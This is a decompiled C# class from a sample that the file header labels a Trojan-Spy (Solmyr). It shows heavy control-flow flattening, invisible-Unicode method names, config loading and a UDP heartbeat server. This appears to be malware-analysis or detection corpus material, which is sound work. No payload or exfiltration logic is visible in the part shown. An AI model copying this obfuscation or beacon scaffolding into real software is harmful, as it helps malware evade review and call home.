// Decompiled with JetBrains decompiler
// Type: EnvironmentPermissionAccess.REDocument
// Assembly: HStringMarshaler, Version=48.18.3.2, Culture=neutral, PublicKeyToken=null
// MVID: C9C3DCB9-2BA4-424F-9339-2594708EFA64
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Solmyr.gen-61b469d1f7dd980add5fef67a976c5ede46680ae91ab253e216d5e99d2b91992.exe

using Microsoft.VisualBasic;
using NumberListCodes;
using RawEvidenceEnumerator;
using System;
using System.Net;
using System.Runtime.InteropServices;

namespace EnvironmentPermissionAccess
{
  public class REDocument
  {
    private BinaryObject ConfigMan;

    public TraceLoggingDataType GSUdpServer { get; set; }

    public TypeForwardedFromAttribute.ConfigEvents Config { get; set; }

    public void Run()
    {
      this.PreInit();
label_1:
      int num1 = -216871193;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -18212882)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            this.Execution();
            num1 = (int) num2 * -661314496 ^ -178037355;
            continue;
          case 2:
            goto label_3;
          case 3:
            this.PostInit();
            num1 = (int) num2 * 2105524650 ^ 282336574;
            continue;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    private void PreInit()
    {
      // ISSUE: type reference
      this.ConfigMan = new BinaryObject(REDocument.\u206F​⁭‭‍‮‭‫‬‎‫‬‭​⁮​‬​⁪⁮⁫⁬‪‫⁭‌⁬⁫⁯​⁭‪⁭⁬⁬‭⁫⁮⁮⁫‮(__typeref (TypeForwardedFromAttribute.ConfigEvents)));
label_1:
      int num1 = 470618034;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 2103271581)) % 11U)
        {
          case 0:
            this.GSUdpServer.Port = this.Config.UDPHeartbeatPort;
            num1 = (int) num2 * 1288083480 ^ 1952402618;
            continue;
          case 1:
            this.Config = (TypeForwardedFromAttribute.ConfigEvents) this.ConfigMan.loadFromFile(OffsetAndRule.ParsingInfo.\u202A‭⁬‬‪‌⁯‬‬‭⁮⁪‪‏⁪⁬‪​‪‬⁯‌⁭‬⁫​⁬⁪‏‭‏‎‏⁮⁬‌⁫‬‍⁬‮<string>(2239661502U), REDocument.\u206E‫‎‏‎‬‮‌‍⁮⁯‭‫‮⁮⁬⁬⁭⁪⁬‍⁮‬‌‫⁮‬⁬‭​‍⁪‫​‬‎⁮⁯‬‏‮(REDocument.\u202A‌‪⁯‬‍⁯⁬‭⁭⁯⁭​​‍‭‍⁪‍⁯‪‌‎​‫‬‮⁪⁬‮‮‍‏‪‏⁭‪‌‮‍‮(), OffsetAndRule.ParsingInfo.\u206F‬⁪‍⁯⁮​‪‮‭‬⁪‮⁪⁬‍⁯‎‭‎⁬‌‬‌⁬‏⁬‬‮‏‮⁪⁭‍‬⁪‫‫⁫‬‮<string>(2068559868U)));
            num1 = (int) num2 * -1949071031 ^ -1581021533;
            continue;
          case 2:
            this.GSUdpServer.Address = REDocument.\u200E⁬‭‍‌‎⁮⁯‫⁮‬‪‭‬⁬‫⁭‭‭‭⁫‫‍‬​‪‎‍‎⁪‌⁫‌‫‫‌⁮⁫‬‭‮(this.Config.UDPHeartbeatAddress);
            num1 = (int) num2 * 551310199 ^ 237244350;
            continue;
          case 3:
            MemberFilter.Buffer.LogFileName = this.Config.LogFileName;
            num1 = (int) num2 * -619704645 ^ 169559084;
            continue;
          case 4:
            MemberFilter.Buffer.MinLogLevel = this.Config.Loglevel;
            num1 = (int) num2 * 1413397457 ^ 212377861;
            continue;
          case 5:
            num1 = (int) num2 * 744757382 ^ -336595193;
            continue;
          case 6:
            this.GSUdpServer = new TraceLoggingDataType(this);
            num1 = (int) num2 * -585981670 ^ 614973066;
            continue;
          case 7:
            goto label_1;
          case 8:
            MemberFilter.Buffer.LogToFile = this.Config.LogToFile;
            num1 = (int) num2 * 319059898 ^ -1232412078;
            continue;
          case 9:
            num1 = (int) num2 * -622799502 ^ -1552171836;
            continue;
          case 10:
            goto label_3;
          default:
            goto label_13;
        }
      }
label_3:
      return;
label_13:;
    }

    private void Execution()
    {
label_1:
      int num1 = -139724320;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -668118347)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            this.GSUdpServer.Open();
            REDocument.\u206F‮‪‍⁬‮⁮⁯⁮‮‎‍⁪⁭‮‏‬⁮‭‭⁬​⁯‎⁮‏⁫‭⁯‏​‌‌⁮⁭‌‌⁪⁮⁭‮();
            MemberFilter.Buffer.Log(OffsetAndRule.ParsingInfo.\u206E​⁬⁪‪⁬⁯‭‮‌⁯​‮‏⁯‭⁬⁪‪‬⁫‬⁪⁫​‭⁮‌⁪‌‭⁮‍​​⁬‪⁬‎‏‮<string>(518150100U), (byte) 2);
            num1 = (int) num2 * 137111 ^ -135694938;
            continue;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    private void PostInit()
    {
      this.GSUdpServer.Close();
label_1:
      int num1 = -1090698213;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -481427218)) % 8U)
        {
          case 0:
            num1 = (int) num2 * -668030529 ^ -2072015697;
            continue;
          case 1:
            goto label_3;
          case 2:
            MemberFilter.Buffer.Log(OffsetAndRule.ParsingInfo.\u200D⁭⁪⁭‌⁬⁬​‪‏⁯⁮⁭‎‭⁯‎⁫‎⁭‫‎‏⁪⁯‬‎‬‌‬‭​​⁬‎‍⁯⁯‭‬‮<string>(3877481602U), (byte) 2);
            num1 = (int) num2 * -1525745107 ^ 1717194572;
            continue;
          case 3:
            goto label_1;
          case 4:
            this.ConfigMan = (BinaryObject) null;
            num1 = (int) num2 * 1443711236 ^ 632976120;
            continue;
          case 5:
            num1 = (int) num2 * 1071468326 ^ -424013596;
            continue;
          case 6:
            this.Config = (TypeForwardedFromAttribute.ConfigEvents) null;
            num1 = (int) num2 * 1899910023 ^ 1260544723;
            continue;
          case 7:
            num1 = (int) num2 * -1433750028 ^ -1881411760;
            continue;
          default:
            goto label_10;
        }
      }
label_3:
      return;
label_10:;
    }

    public bool checkKey(string key, string ip)
    {
label_1:
      int num1 = 84221468;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 617526245)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            flag = true;
            num1 = (int) num2 * -1156202588 ^ -686847313;
            continue;
          case 2:
            num1 = (int) num2 * -1445964133 ^ 2138000516;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return flag;
    }

    static Type \u206F​⁭‭‍‮‭‫‬‎‫‬‭​⁮​‬​⁪⁮⁫⁬‪‫⁭‌⁬⁫⁯​⁭‪⁭⁬⁬‭⁫⁮⁮⁫‮([In] RuntimeTypeHandle obj0) => Type.GetTypeFromHandle(obj0);

    static string \u202A‌‪⁯‬‍⁯⁬‭⁭⁯⁭​​‍‭‍⁪‍⁯‪‌‎​‫‬‮⁪⁬‮‮‍‏‪‏⁭‪‌‮‍‮() => FileSystem.CurDir();

    static string \u206E‫‎‏‎‬‮‌‍⁮⁯‭‫‮⁮⁬⁬⁭⁪⁬‍⁮‬‌‫⁮‬⁬‭​‍⁪‫​‬‎⁮⁯‬‏‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static IPAddress \u200E⁬‭‍‌‎⁮⁯‫⁮‬‪‭‬⁬‫⁭‭‭‭⁫‫‍‬​‪‎‍‎⁪‌⁫‌‫‫‌⁮⁫‬‭‮([In] string obj0) => IPAddress.Parse(obj0);

    static string \u206F‮‪‍⁬‮⁮⁯⁮‮‎‍⁪⁭‮‏‬⁮‭‭⁬​⁯‎⁮‏⁫‭⁯‏​‌‌⁮⁭‌‌⁪⁮⁭‮() => Console.ReadLine();
  }
}
